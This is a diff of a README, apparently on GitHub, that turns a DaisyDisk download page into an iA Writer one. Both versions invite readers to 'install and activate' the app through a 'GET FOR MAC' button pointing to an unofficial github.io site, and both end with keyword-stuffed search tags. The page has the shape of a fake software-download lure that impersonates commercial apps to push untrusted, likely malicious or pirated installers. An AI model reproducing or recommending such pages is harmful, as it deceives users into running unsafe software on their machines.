@@ -1,12 +1,12 @@
-# DaisyDisk – Visual Disk Analyzer & Storage Management Tool
+# iA Writer – Distraction-Free Writing Experience for macOS  
 
 <div align="center">  
-  <img src="https://daisydiskapp.com/img/product.png" width="250"/>  
+  <img src="https://images.icon-icons.com/3053/PNG/512/ia_writer_dark_macos_bigsur_icon_189510.png" width="250"/>  
 </div>  
 <br>  
 <div align="center">  
 
-[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-get-2025.github.io/.github/daisydisk)  
+[![🍏 GET FOR MAC](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-quick-app.github.io/.github/iawriter)  
 
 </div>  
 
@@ -15,24 +15,26 @@
 # Installation Instructions  
 
 1. Go To The Website Using The Button Above.  
-2. Follow The On-Screen Steps To Install And Activate DaisyDisk On Your Mac Device.  
+2. Follow The On-Screen Steps To Install And Activate iA Writer On Your Mac Device.  
 
 ---  
 
 <div align="center">  
-  <img src="https://cyberlab.com/website/wp-content/uploads/2023/06/daisydisk.png" width="1080"/>  
+  <img src="https://i.pcmag.com/imagery/reviews/07uBq1vjbdPQ73V1LGoZ5hv-30..v1627418819.png" width="1080"/>  
 </div>  
 <br>  
 
 ## 🧩 Overview  
 
-**DaisyDisk for macOS** is a beautifully designed disk analyzer that helps you visualize and manage your Mac’s storage with unmatched clarity. Instead of scrolling through endless folders, DaisyDisk displays your entire drive as an interactive, color-coded map — making it easy to spot large or unnecessary files in seconds.  
+**iA Writer for macOS** redefines digital writing by combining elegant simplicity with powerful functionality. It strips away visual clutter, creating a pure and focused writing space that allows your thoughts to flow freely.  
 
-The app scans your system with incredible speed and presents results in an elegant circular chart that’s both informative and intuitive. Simply click on any segment to explore deeper, preview files, and delete what you no longer need — all within a sleek and safe interface.  
+Designed with a philosophy of “clarity first,” **iA Writer** provides a distraction-free interface that lets words take center stage. The clean typography and subtle animations make every writing session immersive and relaxing — whether you’re working on essays, code documentation, or a novel.  
 
-Whether your Mac is running low on space or you just want to stay organized, **DaisyDisk** gives you the tools to understand where your storage is going. With **real-time disk scanning**, **drag-and-drop deletion**, and **instant previews**, it turns cleanup into a simple and satisfying task.  
+The app supports **Markdown**, making formatting quick and intuitive, while **Focus Mode** and **Syntax Highlighting** help you polish text structure and improve readability. Its **live preview** and **quick export** tools let you transform drafts into professional documents effortlessly.  
 
-Optimized for **Apple Silicon**, DaisyDisk runs fast, uses minimal system resources, and supports external drives and cloud storage volumes — making it a must-have utility for every Mac user.  
+**iA Writer** also syncs across all your devices via iCloud and Dropbox, ensuring your projects are always accessible wherever inspiration strikes. Optimized for **Apple Silicon**, it delivers lightning-fast performance, minimal energy use, and smooth operation under macOS.  
+
+In short, it’s more than a text editor — it’s a writing companion built to enhance clarity, creativity, and focus.  
 
 ---  
 
@@ -40,15 +42,15 @@ Optimized for **Apple Silicon**, DaisyDisk runs fast, uses minimal system resour
 
 | Feature                                      | Description                                                                 |
 |----------------------------------------------|------------------------------------------------------------------------------|
-| 🌈 **Visual Storage Map**                     | View your entire disk as a colorful, interactive chart for easy navigation. |
-| ⚡ **Ultra-Fast Scanning Engine**             | Scans disks in seconds with real-time progress updates.                     |
-| 🗂️ **Intuitive File Exploration**             | Drill down into folders visually to identify space-hogging files.           |
-| 🧹 **Safe File Cleanup**                      | Delete files securely right from within the app with built-in safeguards.   |
-| ☁️ **External & Cloud Support**               | Analyze external drives, network volumes, and cloud storage connections.    |
-| 💾 **Live Disk Monitoring**                   | Refresh and compare disk usage instantly as files are added or removed.     |
-| 🪶 **Elegant macOS Interface**                | Modern, fluid design that feels native to macOS aesthetics.                 |
-| ⚙️ **Apple Silicon Optimized**                | Fully native on M1/M2 Macs for exceptional speed and responsiveness.        |
-| 🔒 **Privacy & Security**                     | Processes everything locally — no data leaves your Mac.                     |
+| 🧘 **Distraction-Free Workspace**              | A clean, minimalist layout that keeps your attention on words, not menus.   |
+| ✍️ **Focus Mode**                              | Isolate the current sentence or paragraph to improve writing rhythm.        |
+| 🔤 **Syntax Highlighting**                     | Color-coded word types for better sentence structure and editing flow.      |
+| ☁️ **Seamless Cloud Sync**                     | Keep your work in sync across macOS, iOS, and other connected devices.      |
+| 💬 **Markdown Support**                        | Write and format effortlessly with lightweight, readable syntax.            |
+| 📑 **Quick Export Tools**                      | Convert drafts into PDF, DOCX, or HTML in one click.                        |
+| 🧭 **Organized Document Library**              | Manage your files, notes, and projects with intuitive navigation.           |
+| ⚙️ **Apple Silicon Ready**                     | Native M1/M2 optimization for faster loading and smooth text rendering.     |
+| 🌗 **Adaptive Themes**                         | Switch between light and dark modes for comfortable long writing sessions.  |
 
 ---  
 
@@ -56,7 +58,7 @@ Optimized for **Apple Silicon**, DaisyDisk runs fast, uses minimal system resour
 
 | Component     | Minimum Specifications            |
 |---------------|-----------------------------------|
-| OS            | macOS 11.0 or later               |
+| OS            | macOS 10.14 or later              |
 | Processor     | Apple Silicon (M1/M2) or Intel    |
 | Memory        | 2 GB RAM or higher                |
 | Storage       | 100 MB free disk space            |
@@ -66,4 +68,4 @@ Optimized for **Apple Silicon**, DaisyDisk runs fast, uses minimal system resour
 
 ## 🏷️ Tags  
 
-daisydisk • daisydisk mac • daisy disk • daisy disc mac • daisy disk download • daisydisk download • daisydisk review • daisydisk macos • daisydisk osx • daisydisk app • daisydisk for macos • mac daisy disk • download daisy disk • diskdaisy • daysy disk • daizy disk • daisydiskapp • daisydisk mac review • daisydisk mac download • daisydisk download mac • daisy disk review • daisy disk for mac • daisy disk app  
+ia writer • 1a writer • ia writer mac • ia writer app • ia writer pro • ia writer online • a1 writer • ib internal assessment writing service • write ia • am ia writer • writter ia • ia writer macos • ia writer osx • ia writer for macos • ia writer software • ia writer mac app • ia writer pricing • ia writer mac download • ia writer download • download ia writer • am ia good writer • ai writer mac • ia for writing • ia paper writer  
